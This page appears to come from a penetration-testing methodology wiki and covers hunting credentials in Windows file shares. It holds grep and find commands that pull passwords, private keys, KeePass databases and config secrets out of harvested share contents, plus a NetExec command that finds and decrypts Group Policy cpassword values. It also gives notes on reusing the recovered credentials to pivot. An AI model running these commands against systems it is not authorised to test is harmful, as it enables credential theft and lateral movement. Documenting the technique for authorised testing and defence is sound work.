---
title: "Credential hunting: finding passwords, keys, and tokens in shares"
description: "Share contents are a dense source of credentials: config and script files with embedded passwords, the Group Policy cpassword in SYSVOL, saved private keys and KeePass databases, cloud credential files, and unattend/sysprep answer files. Targeted pattern matching and known-file hunting across spidered shares recover usable credentials."
keywords:
  - credential hunting
  - cpassword
  - groups.xml
  - unattend
  - private keys
---

# Credential hunting

The highest-value loot in shares is credentials, and they appear in predictable forms. The approach is to pull the likely files and pattern-match aggressively, and to look specifically for the known credential-bearing files that Windows and applications leave in shares.

## Pattern-match for embedded secrets

```bash
# across downloaded share content
grep -rinE 'password|passwd|pwd=|secret|api[_-]?key|BEGIN (RSA|OPENSSH) PRIVATE KEY' ./loot
grep -rinE 'connectionstring|Data Source=|User Id=|Server=.*;Password=' ./loot
# config/script types that commonly carry them
find ./loot -iregex '.*\.\(config\|ini\|xml\|ps1\|bat\|cmd\|vbs\|json\|yml\|yaml\)$'
```

## Known credential-bearing files

```bash
# SYSVOL Group Policy Preferences cpassword (AES key is public -> decryptable)
#   \\<domain>\SYSVOL\<domain>\Policies\*\{Machine,User}\Preferences\*\Groups.xml
nxc smb <dc> -u user -p 'pass' -M gpp_password        # finds + decrypts cpassword
# unattend / sysprep answer files with local admin creds
find ./loot -iname 'unattend.xml' -o -iname 'sysprep.inf' -o -iname 'autounattend.xml'
# saved keys and secret stores
find ./loot -iname 'id_rsa' -o -iname '*.ppk' -o -iname '*.pem' -o -iname '*.kdbx'
# web/app config with DB and service creds
find ./loot -iname 'web.config' -o -iname '.env' -o -iname '*.rdp'
```

The Group Policy `cpassword` is a classic: it was encrypted with a key Microsoft published, so any `Groups.xml` (or related Preferences file) in `SYSVOL` containing `cpassword` is trivially decryptable to a usable (often local-admin) credential, and `SYSVOL` is readable by every domain user.

## Exploitation notes

- `SYSVOL` is readable by any authenticated domain user, so the GPP `cpassword` hunt is a reliable early win where legacy Preferences files remain; `gpp_password` both finds and decrypts them.
- Unattend/answer files frequently contain a local administrator password reused across a deployment, making one find broadly useful.
- Recovered private keys and KeePass databases pivot onward (SSH, decrypt the vault offline); connection strings yield database access.
- Feed recovered credentials back into [share enumeration](../share-enumeration.md) as a new identity and into the broader network; many creds found in shares are reused.

## Tools

- [NetExec (gpp_password, spider_plus)](https://github.com/Pennyw0rth/NetExec)
- [Snaffler (targeted share credential hunting)](https://github.com/SnaffCon/Snaffler)

## References

- [MITRE ATT&CK: credentials in files](https://attack.mitre.org/techniques/T1552/001/)
- [MS14-025 (Group Policy Preferences cpassword)](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025)
